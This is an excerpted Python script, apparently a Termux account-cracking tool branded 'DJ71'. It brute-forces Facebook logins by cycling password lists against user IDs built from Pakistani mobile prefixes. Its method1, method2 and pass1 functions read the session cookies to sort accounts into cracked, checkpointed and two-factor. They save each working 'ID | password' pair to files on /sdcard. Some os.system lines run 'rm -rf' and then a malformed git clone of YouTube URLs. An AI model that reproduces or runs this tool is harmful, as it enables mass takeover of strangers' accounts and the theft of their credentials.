...
\033[1;37m╔\033[1;36mDJ\033[1;37m═══════════════════\033[1;36mDJ71?✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;DJ\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mIYANUR.35          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mIYANUR          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m IYANUR420                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mDJ71 GAMING                  \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.2                          \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mTERMUX FREE ALL COMMAND\033[1;37m {\033[1;36mDJ71\033[1;37m} \033[1;31m│
\033[1;37m╚\033[1;36mDJ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mDJ\033[1;37m╝
...
def File_creating():
    os.system(f"git clone https://www.youtube.com/c/DJ71GAMING")

def PROTECT():
    os.system(" rm -rf DATA_PROTECT && git clone https://www.youtube.com/c/DJ71GAMING")

def CYTHONIZER():
    os.system("rm -rf Cython_Changer && git clone https://www.youtube.com/c/DJ71GAMING")


def BOTX():
    os.system("rm -rf BOT && git clone https://github.com/Hamii-king-06/ BOT && cd BOTgit clone https://www.youtube.com/c/DJ71GAMING")
...
def file_crack():
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/DJ_OK.txt\n[•] CP IDS SAVE : /sdcard/DJ_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[DJ71-GAMING 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio DJ71_OK.mp3")
                print('\r\033[1;32m[DJ71-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/DJ71_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio DJ71_2F.mp3")
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio DJ71_OK.mp3")
                print('\r\033[1;32m[DJ71GAMING-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/DJ71_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio DJ71_2F.mp3")
                    print('\r\033[1;35m[DJ71-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/DJ71_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio HAMII_CP.mp3")
...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 017, 018, 019, 013, 016, 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 017/ 018/ 019/ 016/ 013/ 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/DJ71-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/DJ71-CP.txt')
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/DJ71-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[DJ71 🔥] [%s] \33[1;97m[OK:%s{DJ71}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
